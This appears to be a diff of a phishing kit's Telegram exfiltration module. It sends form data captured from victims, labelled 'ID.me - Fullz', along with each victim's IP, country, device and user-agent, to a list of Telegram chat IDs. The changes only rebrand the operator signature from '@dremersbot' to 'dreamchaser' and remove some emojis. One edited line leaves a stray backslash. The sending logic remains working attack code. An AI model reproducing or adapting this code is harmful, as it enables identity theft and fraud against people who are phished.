@@ -106,7 +106,7 @@ export const sendTelegramMessage = async (
   // Check if data is a string (old way) or object (new way)
   if (typeof data === "string") {
     // It's a string message from existing forms
-    message = `${data}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 User IP: ${ip}\n📍 Country: ${country}\n📱 Device: ${deviceInfo}\n🕐 Date/Time: ${addDate}\n🔍 User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*Telegram ID: @dremersbot*`;
+    message = `${data}\n━━━━━━━━━━━━━━━━━━━━━\n User IP: ${ip}\ Country: ${country}\n Device: ${deviceInfo}\n Date/Time: ${addDate}\n User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*dreamchaser*`;
   } else {
     // It's an object from new forms
     const title = formType || "ID.me - Fullz";
@@ -128,7 +128,7 @@ export const sendTelegramMessage = async (
     message += `Date/Time: ${addDate}\n`;
     message += `User-Agent: ${browser}\n`;
     message += `━━━━━━━━━━━━━━━━━━━━━\n`;
-    message += `*Telegram ID: @dremersbot*`;
+    
   }
   
   // Send to all configured chat IDs
@@ -162,7 +162,7 @@ export const sendTelegramFile = async (file: File, customCaption?: string) => {
   const country = await getCountryFromIP(ip);
   const browser = getUserAgent();
   
-  const fullCaption = `${caption}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n📍 Country: ${country}\n🕐 Time: ${addDate}\n🔍 User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*Telegram ID: @dremersbot*`;
+  const fullCaption = `${caption}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP: ${ip}\n Country: ${country}\n Time: ${addDate}\n User-Agent: ${browser}\n━━━━━━━━━━━━━━━━━━━━━\n*Telegram ID: @*`;
   
   for (const chatId of CHAT_IDS) {
     const formData = new FormData();
